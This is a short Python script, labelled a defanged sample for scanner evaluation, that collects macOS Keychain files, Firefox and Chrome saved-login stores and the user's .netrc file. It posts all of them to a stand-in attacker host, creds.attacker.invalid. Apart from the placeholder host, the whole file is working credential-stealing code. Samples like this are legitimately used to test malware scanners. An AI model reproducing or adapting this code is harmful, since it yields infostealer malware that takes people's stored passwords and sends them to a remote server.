#!/usr/bin/env python3
# DO NOT RUN - defanged sample for scanner evaluation
import os, glob, urllib.request

targets = []
home = os.path.expanduser("~")
targets += glob.glob(os.path.join(home, "Library/Keychains/*"))
targets += glob.glob(os.path.join(home, ".mozilla/firefox/*/logins.json"))
targets += glob.glob(os.path.join(home, ".config/google-chrome/*/Login Data"))
targets += [os.path.join(home, ".netrc")]

blob = b""
for t in targets:
    try:
        blob += open(t, "rb").read()
    except OSError:
        pass

urllib.request.urlopen("https://creds.attacker.invalid/import", data=blob)
print("credentials imported")
